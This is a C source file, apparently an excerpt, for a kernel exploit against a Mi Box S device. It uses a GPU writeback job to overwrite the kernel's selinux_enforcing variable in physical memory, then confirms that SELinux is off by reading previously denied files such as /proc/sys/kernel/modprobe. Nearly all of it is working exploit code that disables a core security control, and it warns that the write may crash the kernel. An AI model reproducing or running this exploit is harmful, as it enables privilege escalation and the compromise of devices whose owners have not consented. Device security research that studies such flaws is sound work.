/*
 * kort_selinux_disable.c - Disable SELinux via GPU write to selinux_enforcing
 *
 * Uses 1x1 frame + single-byte format (136 bytes write)
 * to minimize surrounding data corruption.
 *
 * If successful, SELinux will be disabled and we have more freedom.
 */
...
/*
 * Write single-byte value via 1x1 frame, format 0x04 (136 bytes).
 * All bytes in the write area = R value from clear_color.
 */
static int wb_write_byte(uint32_t tgt_offset, uint8_t val)
{
    ...
    /*
     * For single-byte format (0x04 = L8/R8?),
     * the R channel of clear_color determines the byte value.
     * clear_color bits 23-16 = R channel.
     */
    uint32_t clear_color = ((uint32_t)val << 16);  /* R = val */
    ...
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x04;  /* single byte format */
...
int main(void)
{
    ...
    printf("██  ██  ██    ██ ██   ██    ██   \n");
    printf("██   ██  ██████  ██   ██    ██   \n");
    printf("\n    Mi Box S - SELinux Disable Test\n\n");

    printf("[*] selinux_enforcing phys = 0x%08x\n", SELINUX_ENFORCING_PHYS);
    printf("[*] page = 0x%08x, in-page offset = 0x%x\n",
           SELINUX_ENFORCING_PAGE, SELINUX_ENFORCING_INPAGE);
    printf("[*] write format: fmt=0x04 (single byte, ~136 bytes)\n\n");
    ...
    printf("[+] mmap job buf OK\n");

    /* BIND selinux_enforcing page */
    printf("\n[1] BIND selinux_enforcing page...\n");
     ...
     * Write starts at 8-byte aligned offset: inpage_offset & ~7
     * selinux_enforcing is at offset 0x4ec.
     * 8-byte aligned base = 0x4e8.
     * selinux_enforcing is at base + 4.
     *
     * For fmt 0x04 (single byte), all bytes = R value.
     * Writing val=0 sets all 136 bytes to 0.
     * selinux_enforcing (at offset 4 within write) will be 0x00000000.
     */
    uint32_t write_offset = SELINUX_ENFORCING_INPAGE & ~7u;
    printf("\n[2] Writing 0 to selinux_enforcing...\n");
    printf("    write_offset = 0x%x (8-byte aligned)\n", write_offset);
    printf("    selinux_enforcing at offset 0x%x (base + 4)\n", SELINUX_ENFORCING_INPAGE);
    printf("    write size: ~136 bytes (fmt=0x04 1x1)\n");
    printf("    WARNING: This may cause kernel panic if surrounding data is critical!\n\n");

    printf("    Writing... ");
    fflush(stdout);
    int rc = wb_write_byte(write_offset, 0x00);
    if (rc != 0) {
        printf("FAILED (rc=%d)\n", rc);
        return 1;
    }
    ...
    printf("\n[+] Write completed. System still alive?\n");
    ...
    printf("  getenforce: ");
    fflush(stdout);
    int ret = system("getenforce 2>&1");
    (void)ret;

    /* Method 2: try reading /proc/sys/kernel/selinux_enforcing */
    printf("  /proc/sys/kernel/selinux_enforcing: ");
    fflush(stdout);
    FILE *f = fopen("/proc/sys/kernel/selinux_enforcing", "r");
    if (f) {
        char buf[32];
    ...
    /* Method 3: try something that was denied before */
    printf("  /proc/sys/kernel/modprobe read: ");
    fflush(stdout);
    f = fopen("/proc/sys/kernel/modprobe", "r");
    if (f) {
        char buf[128];
        if (fgets(buf, sizeof(buf), f))
            printf("%s", buf);
    ...
    printf("\n[*] If you can read modprobe or getenforce says Permissive,\n");
    printf("[*] then SELinux was successfully disabled!\n");
